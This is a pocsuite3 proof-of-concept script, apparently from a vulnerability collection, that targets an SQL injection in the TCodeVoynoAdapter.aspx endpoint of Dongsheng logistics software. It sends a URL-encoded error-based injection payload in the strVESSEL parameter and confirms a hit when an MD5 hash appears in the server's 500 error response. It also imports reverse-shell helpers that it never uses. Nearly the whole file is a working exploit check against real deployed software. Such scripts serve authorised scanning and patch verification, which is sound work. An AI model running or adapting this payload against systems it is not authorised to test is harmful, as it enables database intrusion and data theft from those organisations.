# _*_ coding:utf-8 _*_
# @Time : 2024/2/23
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class dongsheng_tcodevoynoadapter_sql(POCBase):
    pocDesc = '''东胜物流软件-TCodeVoynoAdapter.aspx接口SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-23'
    name = '东胜物流软件-TCodeVoynoAdapter.aspx接口SQL注入漏洞'
    #body="CompanysAdapter.aspx"


    def _verify(self):

        result = {}
        url = self.url+ '/FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27+and+substring%28sys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%275%27%29%29%2C3%2C32%29%3E0%3B--'

        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        try:

            response = requests.get(url, headers=headers)
            if response.status_code == 500 and 'e4da3b7fbbce2345d7772b0674a318d5' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(dongsheng_tcodevoynoadapter_sql)